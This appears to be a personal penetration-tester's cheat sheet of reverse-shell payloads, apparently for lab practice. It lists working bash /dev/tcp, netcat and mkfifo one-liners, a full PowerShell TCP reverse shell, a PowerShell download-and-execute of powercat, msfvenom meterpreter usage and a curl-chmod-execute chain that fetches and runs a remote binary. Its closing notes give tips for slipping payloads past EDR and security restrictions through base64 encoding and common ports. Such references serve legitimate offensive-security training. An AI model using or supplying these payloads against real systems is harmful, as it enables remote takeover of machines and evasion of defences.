https://www.revshells.com/
#### Listener
```bash
nc -lvnp 4444
```
#### Linux one-liners
```bash
/bin/bash -i >& /dev/tcp/10.10.14.10/4444 0>&1

bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 4444 >/tmp/f

nc 10.10.14.10 4444 -e /bin/bash

busybox nc 10.10.14.10 4444 -e /bin/bash
```
#### Windows one-liners
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

powershell -e <base64_encoded_text>

nc.exe 192.168.45.161 80 -e cmd

# requires http server in ~/tools/windows AND nc listener
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<Kali_IP>/powercat.ps1');powercat -c <Kali_IP> -p 4444 -e cmd"
```

#### Others
APSX
	[ASPX Reverse Shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)


___
#### Msfvenom

Cheat sheet https://github.com/frizb/MSF-Venom-Cheatsheet

General Usage
```bash
msfvenom -p <PAYLOAD> lhost=192.168.45.187 lport=443 -f <extension> -o <filename.extension>

# some payloads
windows/x64/meterpreter/reverse_tcp
windows/shell/shell_reverse_tcp
```

___
to remove / edit...

Some notes for trying to get reverse shells

May need to transfer toolings over
	ie
	nc.exe
	etc...

Try over common ports like 80, 443, 53, etc... stuff that is open to the outside

Try tool full paths
	instead of sh
		/bin/sh
	instead of powershell
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

Try base64 encoding payloads
	ie
		~/tools/mkpsrevshell.py
	can bypass certain syntax issues, security restrictions, EDR, etc

Premade exploits
	READ CODE SLOWLY
	might see flags you are supposed to use that you are missing

URL encoding sucks 
	Revshell has build in encoding if you need it


Try a few different binaries
	nc not working?
	try busybox nc
		etc...
	curl && chmod && execute almost always works
		example:
		`curl 192.168.45.183/revshell -o /tmp/revshell && chmod +x /tmp/revshell && ./revshell